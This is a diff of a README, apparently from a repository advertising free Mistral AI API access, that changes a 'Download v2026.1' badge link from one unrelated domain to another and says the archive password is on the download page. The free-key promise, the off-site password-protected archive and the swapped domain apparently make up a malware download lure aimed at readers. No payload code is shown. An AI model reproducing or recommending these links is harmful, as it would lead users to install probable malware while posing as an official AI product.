@@ -18,7 +18,7 @@ Mistral AI API free — Mistral Large 2, Codestral, and Mistral Small with key r
 
 ## Download
 
-[![Download v2026.1](https://img.shields.io/badge/Download_v2026.1-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/mistralai2)
+[![Download v2026.1](https://img.shields.io/badge/Download_v2026.1-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/mistralai2)
 
 > The archive password is shown on the download page.
 
